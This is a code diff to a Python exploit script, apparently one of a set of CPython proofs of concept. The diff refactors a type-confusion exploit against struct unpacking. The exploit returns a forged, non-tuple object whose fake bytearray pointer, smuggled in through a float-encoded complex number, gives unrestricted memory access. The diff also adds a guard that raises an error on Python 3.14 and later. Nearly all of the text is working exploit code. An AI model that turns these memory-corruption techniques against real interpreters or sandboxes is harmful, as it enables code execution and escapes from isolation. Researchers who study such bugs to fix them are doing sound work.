@@ -30,6 +30,12 @@ struct_unpack_single(const char *ptr, struct unpacker *x)
 }
 """
 
+from common import evil_bytearray_obj, PYVER, i2f
+
+# TODO: write exploit for versions >=3.14, raise an error until then
+if PYVER >= (3, 14, 0):
+    raise NotImplementedError("Changes were made to the tuple struct that makes this exploit not work on versions >=3.14")
+
 # This one's a pretty standard type confusion bug. We just return a non-tuple type that has a fake bytearray
 # object pointer where tuple[0] would normally be to win. 
 
@@ -44,21 +50,13 @@ class Evil:
         return False
 
     def unpack_from(self, mem):
-        global first
+        global first, fake_obj
 
         if first:
-            p64 = lambda num: num.to_bytes(8, 'little')
-            fake_obj = (
-                p64(0x12345) +
-                p64(id(bytearray)) +
-                p64(2**63 - 1) +
-                p64(2**63 - 1) +
-                p64(0) +
-                p64(0)
-            )
+            # see ./common/common.py for evil bytearray obj explanation
+            fake_obj, obj_addr = evil_bytearray_obj()
 
-            i2f = lambda n: 5e-324 * n
-            real, imag = i2f(1), i2f(id(fake_obj) + bytes.__basicsize__ - 1)
+            real, imag = i2f(1), i2f(obj_addr)
             first = False
             
             return complex(real, imag)
